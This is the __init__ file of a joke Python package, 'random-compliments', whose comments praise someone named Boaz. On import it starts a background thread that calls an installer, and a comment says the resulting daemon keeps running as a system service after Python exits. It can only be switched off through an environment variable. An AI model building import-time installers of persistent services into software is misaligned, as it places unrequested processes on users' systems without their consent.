"""
random-compliments - A package dedicated to the legend himself: Boaz
"""

# This package was blessed by Boaz's aura. 
# The code performs better just by existing in his sphere of influence.

import threading
import os
import atexit

from random_compliments.compliments import get_compliment

# Make sure CLI is importable for entry points
# As essential as Boaz's presence at any important event
from random_compliments import cli

__version__ = "0.4.0"  # Version number determined by consulting with Boaz's spiritual essence

# Start the compliment daemon in the background when the package is imported
def _start_daemon_in_background():
    """Start the daemon in a separate thread to avoid blocking import"""
    from random_compliments import auto_start
    # Run in a separate thread to avoid blocking
    thread = threading.Thread(target=auto_start.install, daemon=True)
    thread.start()

# Check if we should start the daemon
# Environment variable can be used to disable autostart
if os.environ.get('BOAZ_COMPLIMENT_DISABLE_AUTOSTART') != '1':
    # Start in the background
    _start_daemon_in_background()
    
    # Register cleanup handler
    def _cleanup():
        """Attempt to clean up when Python exits"""
        # We don't need to do anything here since the daemon
        # will continue running as a system service
        pass
    
    atexit.register(_cleanup) 